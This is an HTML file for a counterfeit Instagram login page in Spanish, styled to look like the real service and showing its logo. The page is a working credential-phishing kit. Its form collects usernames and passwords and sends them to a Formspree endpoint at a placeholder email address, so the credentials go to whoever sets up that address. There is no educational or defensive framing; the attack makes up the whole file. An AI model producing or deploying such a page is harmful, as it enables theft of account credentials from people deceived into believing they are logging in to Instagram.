<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram - Inicio de sesión</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #fafafa; }
        .container { width: 350px; margin: 50px auto; padding: 20px; border: 1px solid #dbdbdb; background-color: #fff; }
        .logo { text-align: center; margin-bottom: 20px; }
        .input-group { margin-bottom: 15px; }
        .input-group label { display: block; margin-bottom: 5px; font-weight: bold; }
        .input-group input { width: 100%; padding: 10px; box-sizing: border-box; border: 1px solid #dbdbdb; }
        .button { width: 100%; padding: 10px; background-color: #0095f6; color: white; border: none; cursor: pointer; }
        .button:hover { background-color: #0084d4; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/1200px-Instagram_logo_2016.svg.png" alt="Instagram Logo" width="180">
        </div>
        <form action="https://formspree.io/tu-correo@example.com" method="POST">
            <div class="input-group">
                <label for="username">Nombre de usuario, correo electrónico o número de teléfono</label>
                <input type="text" id="username" name="username" required>
            </div>
            <div class="input-group">
                <label for="password">Contraseña</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit" class="button">Iniciar sesión</button>
        </form>
    </div>
</body>
</html>
